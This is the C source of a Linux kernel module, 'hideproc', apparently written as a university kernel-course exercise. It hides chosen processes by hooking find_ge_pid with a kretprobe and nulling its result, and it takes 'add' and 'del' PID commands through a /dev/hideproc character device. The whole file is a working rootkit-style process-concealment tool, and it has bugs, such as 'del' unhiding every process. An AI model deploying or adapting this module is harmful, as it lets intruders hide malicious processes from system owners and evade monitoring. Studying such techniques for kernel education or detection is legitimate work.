#include <linux/cdev.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/kprobes.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("National Cheng Kung University, Taiwan");

enum RETURN_CODE { SUCCESS };

typedef struct {
    pid_t id;
    struct list_head list_node;
} pid_node_t;

LIST_HEAD(hidden_proc);

static bool is_hidden_proc(pid_t pid)
{
    pid_node_t *proc, *tmp_proc;
    list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {
        if (proc->id == pid)
            return true;
    }
    return false;
}

static int hide_process(pid_t pid)
{
    pid_node_t *proc = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
    proc->id = pid;
    list_add_tail(&proc->list_node, &hidden_proc);
    return SUCCESS;
}

static int unhide_process(pid_t pid)
{
    pid_node_t *proc, *tmp_proc;
    list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {
        list_del(&proc->list_node);
        kfree(proc);
    }
    return SUCCESS;
}

static int entry_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    if (!current->mm)
        return 1;	/* Skip kernel threads */

    return 0;
}

static int ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct pid *pid = (struct pid *)regs_return_value(regs);
    if (pid && is_hidden_proc(pid->numbers->nr))
    {	
        regs->ax = (unsigned long)0;
    }	

    return 0;
}

#define OUTPUT_BUFFER_FORMAT "pid: %d\n"
#define MAX_MESSAGE_SIZE (sizeof(OUTPUT_BUFFER_FORMAT) + 4)

static int device_open(struct inode *inode, struct file *file)
{
    return SUCCESS;
}

static int device_close(struct inode *inode, struct file *file)
{
    return SUCCESS;
}

static ssize_t device_read(struct file *filep,
                           char *buffer,
                           size_t len,
                           loff_t *offset)
{
    pid_node_t *proc, *tmp_proc;
    char message[MAX_MESSAGE_SIZE];
    if (*offset)
        return 0;

    list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {
        memset(message, 0, MAX_MESSAGE_SIZE);
        sprintf(message, OUTPUT_BUFFER_FORMAT, proc->id);
        copy_to_user(buffer + *offset, message, strlen(message));
        *offset += strlen(message);
    }
    return *offset;
}

static ssize_t device_write(struct file *filep,
                            const char *buffer,
                            size_t len,
                            loff_t *offset)
{
    long pid;
    char *message;

    char add_message[] = "add", del_message[] = "del";
    if (len < sizeof(add_message) - 1 && len < sizeof(del_message) - 1)
        return -EAGAIN;

    message = kmalloc(len + 1, GFP_KERNEL);
    memset(message, 0, len + 1);
    copy_from_user(message, buffer, len);
    if (!memcmp(message, add_message, sizeof(add_message) - 1)) {
        kstrtol(message + sizeof(add_message), 10, &pid);
        hide_process(pid);
    } else if (!memcmp(message, del_message, sizeof(del_message) - 1)) {
        kstrtol(message + sizeof(del_message), 10, &pid);
        unhide_process(pid);
    } else {
        kfree(message);
        return -EAGAIN;
    }

    *offset = len;
    kfree(message);
    return len;
}

static struct cdev cdev;
static struct class *hideproc_class = NULL;
static dev_t dev;
static int dev_major;

static const struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = device_open,
    .release = device_close,
    .read = device_read,
    .write = device_write,
};

static struct kretprobe hide_kretprobe = {
    .handler            = ret_handler,
    .entry_handler      = entry_handler,
    .maxactive	        = 20,
    .kp.symbol_name     = "find_ge_pid",
};

#define MINOR_VERSION 1
#define DEVICE_NAME "hideproc"

static int _hideproc_init(void)
{
    int err;

    printk(KERN_INFO "@ %s\n", __func__);
    err = register_kretprobe(&hide_kretprobe);
    if (err < 0) {
        printk(KERN_INFO "register_kretprobe failed, returned %d\n",
                err);
        return -1;
    }
    err = alloc_chrdev_region(&dev, MINOR_VERSION, 1, DEVICE_NAME);
    if (err < 0) {
        printk(KERN_INFO "alloc_chrdev_region failed, returned %d\n",
                err);
        return -1;
    }
    dev_major = MAJOR(dev);

    hideproc_class = class_create(THIS_MODULE, DEVICE_NAME);

    cdev_init(&cdev, &fops);
    cdev_add(&cdev, MKDEV(dev_major, MINOR_VERSION), 1);
    device_create(hideproc_class, NULL, MKDEV(dev_major, MINOR_VERSION), NULL,
                    DEVICE_NAME);


    return 0;
}

static void _hideproc_exit(void)
{
    pid_node_t *proc, *tmp_proc;

    printk(KERN_INFO "@ %s\n", __func__);

    list_for_each_entry_safe(proc, tmp_proc, &hidden_proc, list_node) {
        list_del(&proc->list_node);
        kfree(proc);
    }
    device_destroy(hideproc_class, MKDEV(dev_major, MINOR_VERSION));
    class_destroy(hideproc_class);
    cdev_del(&cdev);
    unregister_kretprobe(&hide_kretprobe);
}

module_init(_hideproc_init);
module_exit(_hideproc_exit);
